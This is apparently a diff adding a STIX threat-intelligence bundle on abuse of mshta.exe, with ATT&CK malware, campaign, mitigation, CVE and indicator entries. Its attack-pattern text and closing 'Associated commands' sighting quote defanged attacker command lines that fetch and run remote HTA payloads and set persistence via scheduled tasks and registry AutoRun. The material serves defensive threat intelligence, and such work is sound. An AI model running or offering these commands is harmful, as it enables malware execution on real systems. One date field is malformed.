+      "description": "[Sibot](https://attack.mitre.org/software/S0589) is dual-purpose malware written in VBScript designed to achieve persistence on a compromised system as well as download and execute additional payloads. Microsoft discovered three [Sibot](https://attack.mitre.org/software/S0589) variants in early 2021 during its investigation of [APT29](https://attack.mitre.org/groups/G0016) and the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024).(Citation: MSTIC NOBELIUM Mar 2021)",
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_version": "1.1",
+      "x_mitre_aliases": [
+        "Sibot"
+      ],
+      "type": "malware",
+      "id": "malware--979adb5a-dc30-48f0-9e3d-9a26d866928c",
+      "created": "2021-03-12T18:08:23.552Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0589",
+          "external_id": "S0589"
+        },
+        {
+          "source_name": "MSTIC NOBELIUM Mar 2021",
+          "description": "Nafisi, R., Lelli, A. (2021, March 4). GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence. Retrieved March 8, 2021.",
+          "url": "https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_platforms": [
+        "Windows",
+        "Linux"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_aliases": [
+        "Xbash"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "malware--6a92d80f-cc65-45f6-aa66-3cdea6786b3c",
+      "type": "malware",
+      "created": "2019-01-30T13:28:47.452Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "external_id": "S0341",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0341"
+        },
+        {
+          "source_name": "Xbash",
+          "description": "(Citation: Unit42 Xbash Sept 2018)"
+        },
+        {
+          "description": "Xiao, C. (2018, September 17). Xbash Combines Botnet, Ransomware, Coinmining in Worm that Targets Linux and Windows. Retrieved November 14, 2018.",
+          "url": "https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/",
+          "source_name": "Unit42 Xbash Sept 2018"
+        }
+      ],
+      "modified": "2020-06-23T20:41:28.496Z",
+      "name": "Xbash",
+      "description": "[Xbash](https://attack.mitre.org/software/S0341) is a malware family that has targeted Linux and Microsoft Windows servers. The malware has been tied to the Iron Group, a threat actor group known for previous ransomware attacks. [Xbash](https://attack.mitre.org/software/S0341) was developed in Python and then converted into a self-contained Linux ELF executable by using PyInstaller.(Citation: Unit42 Xbash Sept 2018)",
+      "x_mitre_version": "1.2",
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Koadic",
+      "description": "[Koadic](https://attack.mitre.org/software/S0250) is a Windows post-exploitation framework and penetration testing tool that is publicly available on GitHub. [Koadic](https://attack.mitre.org/software/S0250) has several options for staging payloads and creating implants, and performs most of its operations using Windows Script Host.(Citation: Github Koadic)(Citation: Palo Alto Sofacy 06-2018)(Citation: MalwareBytes LazyScripter Feb 2021)",
+      "modified": "2022-04-06T19:32:33.511Z",
+      "labels": [
+        "tool"
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_aliases": [
+        "Koadic"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "type": "tool",
+      "id": "tool--c8655260-9f4b-44e3-85e1-6538a5f6e4f4",
+      "created": "2018-10-17T00:14:20.652Z",
+      "x_mitre_version": "2.0",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "S0250",
+          "url": "https://attack.mitre.org/software/S0250"
+        },
+        {
+          "source_name": "Koadic",
+          "description": "(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021)"
+        },
+        {
+          "source_name": "MalwareBytes LazyScripter Feb 2021",
+          "url": "https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf",
+          "description": "Jazi, H. (2021, February). LazyScripter: From Empire to double RAT. Retrieved November 24, 2021."
+        },
+        {
+          "source_name": "Palo Alto Sofacy 06-2018",
+          "url": "https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/",
+          "description": "Lee, B., Falcone, R. (2018, June 06). Sofacy Group’s Parallel Attacks. Retrieved June 18, 2018."
+        },
+        {
+          "source_name": "Github Koadic",
+          "url": "https://github.com/zerosum0x0/koadic",
+          "description": "Magius, J., et al. (2017, July 19). Koadic. Retrieved June 18, 2018."
+        }
+      ],
+      "x_mitre_deprecated": false,
+      "revoked": false,
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Associated Malware",
+      "description": "Malware been observed using LOLBin tool Mshta.exe",
+      "type": "grouping",
+      "spec_version": "2.1",
+      "id": "grouping-646e6344-714b-436a-9920-0a1f452ade14",
+      "created": "2023-08-20T17:34:58.798Z",
+      "modified": "2023-08-20T17:34:58.798Z",
+      "context": "suspicious-activity",
+      "object_refs": [
+        "malware--d1b7830a-fced-4be3-a99c-f495af9d9e1b",
+        "malware--c151b1f5-d3ae-4490-97db-7efc2ec8d31c",
+        "malware--81c57a96-fc8c-4f91-af8e-63e24c2927c2",
+        "malware--705f0783-5f7d-4491-b6b7-9628e6e006d2",
+        "malware--e8545794-b98c-492b-a5b3-4b5a02682e37",
+        "malware--5f9f7648-04ba-4a9f-bb4c-2a13e74572bd",
+        "malware--bdb27a1d-1844-42f1-a0c0-826027ae0326",
+        "malware--979adb5a-dc30-48f0-9e3d-9a26d866928c",
+        "malware--6a92d80f-cc65-45f6-aa66-3cdea6786b3c",
+        "tool--c8655260-9f4b-44e3-85e1-6538a5f6e4f4"
+      ]
+    },
+    {
+      "source_ref": "grouping-646e6344-714b-436a-9920-0a1f452ade14",
+      "target_ref": "tool--577a8da2-77cf-490c-8f92-55976b5c3116",
+      "relationship_type": "uses",
+      "type": "relationship",
+      "created": "2023-08-20T18:53:57.511Z",
+      "modified": "2023-08-20T18:53:57.511Z",
+      "id": "relationship--ad1ee6dd-984b-48c3-a9cc-8ad2e77e947b",
+      "targetObjectType": "grouping"
+    },
+    {
+      "modified": "2022-09-30T21:05:22.490Z",
+      "name": "Operation Dust Storm",
+      "description": "[Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) was a long-standing persistent cyber espionage campaign that targeted multiple industries in Japan, South Korea, the United States, Europe, and several Southeast Asian countries. By 2015, the [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) threat actors shifted from government and defense-related intelligence targets to Japanese companies or Japanese subdivisions of larger foreign organizations supporting Japan's critical infrastructure, including electricity generation, oil and natural gas, finance, transportation, and construction.(Citation: Cylance Dust Storm)\n\n[Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) threat actors also began to use Android backdoors in their operations by 2015, with all identified victims at the time residing in Japan or South Korea.(Citation: Cylance Dust Storm)",
+      "aliases": [
+        "Operation Dust Storm"
+      ],
+      "first_seen": "2010-01-01T07:00:00.000Z",
+      "last_seen": "2016-02-01T06:00:00.000Z",
+      "x_mitre_first_seen_citation": "(Citation: Cylance Dust Storm)",
+      "x_mitre_last_seen_citation": "(Citation: Cylance Dust Storm)",
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "1.0",
+      "type": "campaign",
+      "id": "campaign--4603cf2f-06d0-4970-9c5d-5071b08c817f",
+      "created": "2022-09-29T20:00:38.136Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/campaigns/C0016",
+          "external_id": "C0016"
+        },
+        {
+          "source_name": "Cylance Dust Storm",
+          "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.",
+          "url": "https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_attack_spec_version": "3.0.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "x_mitre_domains": [
+        "enterprise-attack",
+        "mobile-attack"
+      ]
+    },
+    {
+      "modified": "2022-09-29T20:37:46.689Z",
+      "name": "C0015",
+      "description": "[C0015](https://attack.mitre.org/campaigns/C0015) was a ransomware intrusion during which the unidentified attackers used [Bazar](https://attack.mitre.org/software/S0534), [Cobalt Strike](https://attack.mitre.org/software/S0154), and [Conti](https://attack.mitre.org/software/S0575), along with other tools, over a 5 day period. Security researchers assessed the actors likely used the widely-circulated [Conti](https://attack.mitre.org/software/S0575) ransomware playbook based on the observed pattern of activity and operator errors.(Citation: DFIR Conti Bazar Nov 2021)",
+      "aliases": [
+        "C0015"
+      ],
+      "first_seen": "2021-08-01T05:00:00.000Z",
+      "last_seen": "2021-08-01T05:00:00.000Z",
+      "x_mitre_first_seen_citation": "(Citation: DFIR Conti Bazar Nov 2021)",
+      "x_mitre_last_seen_citation": "(Citation: DFIR Conti Bazar Nov 2021)",
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "1.0",
+      "x_mitre_contributors": [
+        "Matt Brenton, Zurich Insurance Group"
+      ],
+      "type": "campaign",
+      "id": "campaign--78068e68-4124-4243-b6f4-76e4e5be8a06",
+      "created": "2022-09-29T16:42:29.364Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/campaigns/C0015",
+          "external_id": "C0015"
+        },
+        {
+          "source_name": "DFIR Conti Bazar Nov 2021",
+          "description": "DFIR Report. (2021, November 29). CONTInuing the Bazar Ransomware Story. Retrieved September 29, 2022.",
+          "url": "https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_attack_spec_version": "3.0.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ]
+    },
+    {
+      "name": "Associated campaigns",
+      "description": "campaign been observed using LOLBin tool Mshta.exe",
+      "type": "grouping",
+      "spec_version": "2.1",
+      "id": "grouping-1651bfdc-cde5-4863-b287-eb8fd3bf8b16",
+      "created": "2023-08-20T17:34:58.798Z",
+      "modified": "2023-08-20T17:34:58.798Z",
+      "context": "suspicious-activity",
+      "object_refs": [
+        "campaign--78068e68-4124-4243-b6f4-76e4e5be8a06",
+        "campaign--4603cf2f-06d0-4970-9c5d-5071b08c817f"
+
+      ]
+    },
+    {
+      "source_ref": "grouping-1651bfdc-cde5-4863-b287-eb8fd3bf8b16",
+      "target_ref": "tool--577a8da2-77cf-490c-8f92-55976b5c3116",
+      "relationship_type": "uses",
+      "type": "relationship",
+      "created": "2023-08-20T18:53:57.511Z",
+      "modified": "2023-08-20T18:53:57.511Z",
+      "id": "relationship--37ed155f-83cd-4ec2-bc29-669b30e99b34",
+      "targetObjectType": "grouping"
+    },
+    {
+      "source_ref": "grouping-1651bfdc-cde5-4863-b287-eb8fd3bf8b16",
+      "target_ref": "tool--577a8da2-77cf-490c-8f92-55976b5c3116",
+      "relationship_type": "uses",
+      "type": "relationship",
+      "created": "2023-08-20T18:53:57.511Z",
+      "modified": "2023-08-20T18:53:57.511Z",
+      "id": "relationship--37ed155f-83cd-4ec2-bc29-669b30e99b34",
+      "targetObjectType": "grouping"
+    },
+    {
+      "name": "Disable or Remove Feature or Program",
+      "description": "Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.\n\n Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life.",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31",
+      "type": "course-of-action",
+      "created": "2019-06-11T16:45:19.740Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "M1042",
+          "url": "https://attack.mitre.org/mitigations/M1042"
+        }
+      ],
+      "modified": "2020-03-31T13:12:04.776Z",
+      "x_mitre_version": "1.1",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Execution Prevention",
+      "description": "Block execution of code on a system through application control, and/or script blocking.",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db",
+      "type": "course-of-action",
+      "created": "2019-06-11T16:35:25.488Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "M1038",
+          "url": "https://attack.mitre.org/mitigations/M1038"
+        }
+      ],
+      "modified": "2022-02-28T19:50:41.210Z",
+      "x_mitre_version": "1.2",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Change Default Applications",
+      "description": "One of the easiest things you can implement is to change the default applications for files with an .hta extension from mshta.exe to a plain text editor such as notepad. This can help keep users from unwittingly double-clicking a malicious .hta attachment",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "id": "course-of-action--0644d5a7-b103-488b-9ad8-be1227c0868f",
+      "type": "course-of-action",
+      "created": "2023-09-10T16:35:25.488Z",
+      "external_references": [
+        {
+          "source_name": "mcafee",
+          "external_id": "-",
+          "url": "https://www.mcafee.com/learn/what-is-mshta-how-can-it-be-used-and-how-to-protect-against-it/"
+        }
+      ],
+      "modified": "2023-09-10T16:35:25.488Z",
+      "x_mitre_version": "1.2"
+    },
+    {
+      "name": "Mshta Mitigation",
+      "description": "Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life. Use application whitelisting configured to block execution of mshta.exe if it is not required for a given system or network to prevent potential misuse by adversaries.",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "course-of-action--d2dce10b-3562-4d61-b2f5-7c6384b038e2",
+      "type": "course-of-action",
+      "created": "2018-10-17T00:14:20.652Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "external_id": "T1170",
+          "url": "https://attack.mitre.org/mitigations/T1170",
+          "source_name": "mitre-attack"
+        }
+      ],
+      "modified": "2019-07-25T11:14:01.112Z",
+      "x_mitre_deprecated": true,
+      "x_mitre_version": "1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "id": "grouping--57914b56-b28e-43c4-878f-b8501e56aff4",
+      "type": "grouping",
+      "spec_version": 2.1,
+      "created": "2023-09-05T23:23:32+01:00",
+      "modified": "2023-09-05T23:23:32+01:00",
+      "name": "Associated Mitigations",
+      "description": "Associated Mitigations",
+      "context": "unspecified",
+      "object_refs": [
+        "tool--577a8da2-77cf-490c-8f92-55976b5c3116",
+        "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db",
+        "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31",
+        "course-of-action--d2dce10b-3562-4d61-b2f5-7c6384b038e2",
+        "course-of-action--0644d5a7-b103-488b-9ad8-be1227c0868f"
+      ]
+    },
+    {
+      "id": "file--f10531f5-c1c8-4d5b-ae57-ffeb53916caa",
+      "type": "file",
+      "spec_version": "2.1",
+      "name": "mshta.exe",
+      "parent_directory_ref": [
+        "directory--0d305fea-911d-4b96-a333-e1adf55d107a",
+        "directory--a4859a64-7bf4-4060-a2c1-c2b035a457db"
+      ]
+    },
+    {
+      "id": "directory--0d305fea-911d-4b96-a333-e1adf55d107a",
+      "type": "directory",
+      "spec_version": "2.1",
+      "path": "c:\\windows\\system32\\mshta.exe"
+    },
+    {
+      "id": "directory--a4859a64-7bf4-4060-a2c1-c2b035a457db",
+      "type": "directory",
+      "spec_version": "2.1",
+      "path": "c:\\windows\\syswow64\\mshta.exe"
+    },
+    {
+      "id": "observed-data--59c1a552-ee03-495e-9709-eb29f83d0af6",
+      "type": "observed-data",
+      "spec_version": "2.1",
+      "created": "2023-09-05T23:23:32+01:00",
+      "modified": "22023-09-05T23:23:32+01:00",
+      "first_observed": "2019-12-11T23:23:32+01:00",
+      "last_observed": "2023-09-05T23:23:32+01:00",
+      "number_observed": 12,
+      "object_refs": [
+        "file--f10531f5-c1c8-4d5b-ae57-ffeb53916caa"
+      ]
+    },
+    {
+      "description": "Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.",
+      "pattern": "[file:hashes.'SHA-256' = '213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC']",
+      "id": "indicator--750757ff-8724-41f0-b5f7-1a63ba2bda3a",
+      "type": "indicator",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "name": "06B02D5C097C7DB1F109749C45F3F505",
+      "pattern_type": "stix",
+      "valid_from": "2018-12-12T18:02:03+01:00",
+      "valid_until": "2023-08-20T18:02:03+01:00"
+    },
+    {
+      "source_ref": "indicator--750757ff-8724-41f0-b5f7-1a63ba2bda3a",
+      "target_ref": "tool--577a8da2-77cf-490c-8f92-55976b5c3116",
+      "relationship_type": "indicates",
+      "type": "relationship",
+      "created": "2023-09-12T13:45:03.075Z",
+      "modified": "2023-09-12T13:45:03.076Z",
+      "id": "relationship--61bec7f9-ce6b-4368-a826-c4fc78b552b8",
+      "targetObjectType": "tool"
+    },
+    {
+      "source_ref": "indicator--750757ff-8724-41f0-b5f7-1a63ba2bda3a",
+      "target_ref": "observed-data--59c1a552-ee03-495e-9709-eb29f83d0af6",
+      "relationship_type": "based-on",
+      "type": "relationship",
+      "created": "2023-08-20T19:59:49.268Z",
+      "modified": "2023-08-20T19:59:49.268Z",
+      "id": "relationship--7e9b10a8-e92b-428e-a450-b8a285bb44a1",
+      "targetObjectType": "indicator"
+    },
+    {
+      "name": "CVE-2017-0199",
+      "description": "CVE-2017-0199: This vulnerability was exploited in the wild, leveraging the HTA handler.",
+      "id": "vulnerability--bcc71a5a-70b9-4dd1-9b6a-e2877a7a6f59",
+      "type": "vulnerability",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00"
+    },
+    {
+      "name": "CVE-2018-0802",
+      "description": "CVE-2018-0802: A remote code execution vulnerability exists in Microsoft Office software when the software fails to properly handle objects in memory",
+      "id": "vulnerability--bd0f3826-908f-4f10-8de3-98fb36add3a4",
+      "type": "vulnerability",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00"
+    },
+    {
+      "name": "CVE-2017-11882",
+      "description": "CVE-2017-11882: Since November 20th, 2017, thousands of attempted attacks exploiting this vulnerability were identified. Most of these used techniques that involved calling cmd.exe directly or using mshta.exe or cscript.exe to execute a remote script from an attacker-controlled server.",
+      "id": "vulnerability--8fb6a9d7-5d0d-4817-9dcc-233802aaaf33",
+      "type": "vulnerability",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00"
+    },
+    {
+      "description": " Mshta.exe has been used to exploit CVE-2017-11882 and CVE-2017-0199",
+      "id": "sighting--111acff7-fde4-4702-9de4-4a96019dbc3d",
+      "type": "sighting",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "external_references": [
+        {
+          "source_name": "mandiant",
+          "url": "https://www.mandiant.com/resources/blog/cve-2017-0199-hta-handler#SnippetTab"
+        },
+        {
+          "source_name": "unit42",
+          "url": "https://unit42.paloaltonetworks.com/unit42-analysis-of-cve-2017-11882-exploit-in-the-wild/"
+        }
+      ],
+      "sighting_of_ref": [
+        "tool--577a8da2-77cf-490c-8f92-55976b5c3116",
+        "vulnerability--8fb6a9d7-5d0d-4817-9dcc-233802aaaf33",
+        "vulnerability--bcc71a5a-70b9-4dd1-9b6a-e2877a7a6f59",
+        "vulnerability--bd0f3826-908f-4f10-8de3-98fb36add3a4"
+      ]
+    },
+    {
+      "modified": "2022-03-11T20:38:28.802Z",
+      "name": "Mshta",
+      "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_contributors": [
+        "@ionstorm",
+        "Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank",
+        "Ricardo Dias"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
+      "type": "attack-pattern",
+      "created": "2020-01-23T19:32:49.557Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1218.005",
+          "url": "https://attack.mitre.org/techniques/T1218/005"
+        },
+        {
+          "url": "https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf",
+          "description": "Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.",
+          "source_name": "Cylance Dust Storm"
+        },
+        {
+          "source_name": "Red Canary HTA Abuse Part Deux",
+          "description": "McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",
+          "url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/"
+        },
+        {
+          "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html",
+          "description": "Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",
+          "source_name": "FireEye Attacks Leveraging HTA"
+        },
+        {
+          "description": "Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",
+          "source_name": "Airbus Security Kovter Analysis",
+          "url": "https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/"
+        },
+        {
+          "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html",
+          "description": "Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.",
+          "source_name": "FireEye FIN7 April 2017"
+        },
+        {
+          "source_name": "Wikipedia HTML Application",
+          "description": "Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",
+          "url": "https://en.wikipedia.org/wiki/HTML_Application"
+        },
+        {
+          "source_name": "MSDN HTML Applications",
+          "description": "Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",
+          "url": "https://msdn.microsoft.com/library/ms536471.aspx"
+        },
+        {
+          "source_name": "LOLBAS Mshta",
+          "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
+          "description": "LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019."
+        }
+      ],
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "defense-evasion"
+        }
+      ],
+      "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious",
+      "x_mitre_is_subtechnique": true,
+      "x_mitre_version": "2.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "x_mitre_data_sources": [
+        "Network Traffic: Network Connection Creation",
+        "Process: Process Creation",
+        "Command: Command Execution",
+        "File: File Creation"
+      ],
+      "x_mitre_defense_bypassed": [
+        "Application control",
+        "Digital Certificate Validation"
+      ],
+      "x_mitre_permissions_required": [
+        "User"
+      ]
+    },
+    {
+      "source_ref": "attack-pattern--840a987a-99bd-4a80-a5c9-0cb2baa6cade",
+      "target_ref": "tool--577a8da2-77cf-490c-8f92-55976b5c3116",
+      "relationship_type": "uses",
+      "type": "relationship",
+      "created": "2023-09-16T20:45:18.003Z",
+      "modified": "2023-09-16T20:45:18.003Z",
+      "id": "relationship--4d9e32b4-8a69-4442-9196-3e1cf8dc6d6c",
+      "targetObjectType": "tool"
+    },
+    {
+      "name": "Associated commands",
+      "description": "The associated mshta commands that has been used by the threat actors: \"HKCU\\\\Software\\\\Microsoft\\\\Command Processor\\\\AutoRun, value: \\\"powershell.exe mshta hxxps://tdalpacafarm[.]com/files/kr/contents/Usoro.hta\",\n        \"schtasks /create /sc MINUTE /tn \\\"Windows Error Reporting\\\" /tr \\\"mshta.exe about:'<script language=\\\"vbscript\\\" src=\\\"hxxp://110.10.179(.)65:80/download/microsoftp.jpg\\\">code close</script>'\\\" /mo 15 /F\",\n        \"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Command Processor\\\" /v AutoRun /t REG_SZ /d \\\"powershell.exe start-process -windowstyle hidden -filepath mshta.exe hxxps://bit-albania[.]com/[REDACTED]/Drfwj.hta\\\" /f\",\n        \"Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN AutomaticChromeUpdater /TR 'mshta hxxp://hpsj.firewall-gateway.net:8080/MicrosoftUpdate' /SC minute /mo 60} \\\"C:\\\\WINDOWS\\\\system32\\\\schtasks.exe\\\" /create /TN AutomaticChromeUpdater /TR \\\"mshta hxxp://hpsj.firewall-gateway.net:8080/MicrosoftUpdate\\\" /SC minute /mo 60\",\n        \"shellObj.Run \\\"forfiles /p c:\\\\windows /m HelpPane.exe /c \\\"\\\"mshta C:\\\\WMAuthorization\\\\WMPlaybackSrv \\\"\\\"hxxps://markettrendingcenter.com/member.htm\\\", 0, True\",\n        \"C:\\\\Windows\\\\System32\\rundll32.exe hxxp://hpsj.firewall-gateway.net:8080/MicrosoftUpdate?PPVXCF8Y4U=2368b7b9facb4a3b8acf72d29ea28704;UGH09GLI5P=;\\\\..\\\\..\\\\..\\\\./mshtml,RunHTMLApplication mshta.exe hxxp[:]//malicioussite.com/superlegit.hta\",\n        \"mshta vbscript:(CreateObject(“WS”+”C”+”rI”+”Pt.ShEll”)).Run(“powershell”,1,True)(window.close)\",\n        \"mshta javascript:a=GetObject(“script:hxxp://c2[.]com/cmd.sct”).Exec()\"",
+      "id": "sighting--e4229fc0-cc31-43a2-a544-d416fc4ab071",
+      "type": "sighting",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
